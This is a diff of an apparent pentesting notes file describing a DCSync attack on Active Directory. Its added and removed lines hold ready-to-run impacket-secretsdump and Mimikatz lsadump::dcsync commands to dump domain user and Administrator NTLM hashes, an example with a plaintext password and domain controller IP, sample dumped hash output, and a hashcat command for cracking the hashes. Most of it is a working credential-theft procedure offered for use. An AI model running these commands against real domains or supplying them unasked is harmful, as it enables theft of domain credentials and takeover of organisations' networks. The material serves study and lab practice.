@@ -15,7 +15,15 @@ Get-DomainUser -Identity adunn | Select-Object samaccountname, objectsid, member
 ---
 
 ### 2. Verify Replication Rights
-
+Required privileges to perform replication:
+        - **Replicating Directory Changes**
+        - **Replicating Directory Changes All**
+        - **Replicating Directory Changes in Filtered Set**
+    - By default, members of the following groups have these rights:
+        - Domain Admins
+        - Enterprise Admins
+        - Administrators
+        
 **Goal:** Confirm that the target (or another account you control) has the required replication privileges.
 
 **Sample Command (using PowerView):**
@@ -47,6 +55,25 @@ secretsdump.py -outputfile domain_hashes -just-dc YOURDOMAIN/targetUser@targetIP
     - `YOURDOMAIN`: Replace with your actual domain name.
     - `targetUser`: The username that has replication privileges.
     - `targetIP`: The IP address of the domain controller.
+Or 
+       
+        ```bash
+        impacket-secretsdump -just-dc-user <username> <domain>/<admin_user>:<password>@<dc_ip>
+        ```
+        
+    - **Example**:
+        
+        ```bash
+        impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
+        ```
+        
+    - **Result (Extract)**:
+        
+        ```
+        [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+        dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
+        ```
+        
 - **What It Does:** Initiates a replication request mimicking a DC. It writes out the NTLM hashes, Kerberos keys, and, if applicable, cleartext passwords to files prefixed with `domain_hashes`.
 
 **After Running, List the Files:**
@@ -63,30 +90,49 @@ ls domain_hashes*
 ---
 
 ### 4. Executing the DCSync Attack with Mimikatz
-
-**Goal:** Use Mimikatz to request replication data from the DC in-memory.
-#### 4.1 Launch a Privileged PowerShell Session
-
-**Using runas.exe to open a session as the target user:**
-
-```cmd
-runas /netonly /user:YOURDOMAIN\targetUser powershell
-```
-
-- **Enter the password** when prompted.
-
-#### 4.2 Run Mimikatz in the Elevated Session
-
-**Start Mimikatz:**
-
-```powershell
-.\mimikatz.exe
-```
-
-**Inside Mimikatz, run the DCSync command:**
-
-```mimikatz
-lsadump::dcsync /domain:YOURDOMAIN.LOCAL /user:YOURDOMAIN\administrator
-```
-
-- **What It Does:** Requests replication data for the `administrator` account (or another account of your choice) from the domain controller. Mimikatz will display information including the NTLM hash and other credential details.
+**Run Mimikatz**
+    
+    ```bash
+    .\mimikatz.exe
+    ```
+    
+    - **Command**: Dump the NTLM hash of a target user:
+        
+        ```bash
+        lsadump::dcsync /user:<domain>\<username>
+        ```
+        
+    - **Example**:
+        
+        ```bash
+        lsadump::dcsync /user:corp\dave
+        ```
+        
+    - **Result (Extract)**:
+        
+        ```
+        Credentials:
+            Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494
+        ```
+        
+3. **Crack the NTLM Hash**
+    
+    - **Command**:
+        
+        ```bash
+        hashcat -m 1000 <hash_file> <wordlist> -r <rule_file> --force
+        ```
+        
+    - **Example**:
+        
+        ```bash
+        hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+        ```
+        
+4. **Dump Domain Admin Hashes**
+    
+    - Dump credentials of the **Administrator** user:
+        
+        ```bash
+        lsadump::dcsync /user:corp\Administrator
+        ```
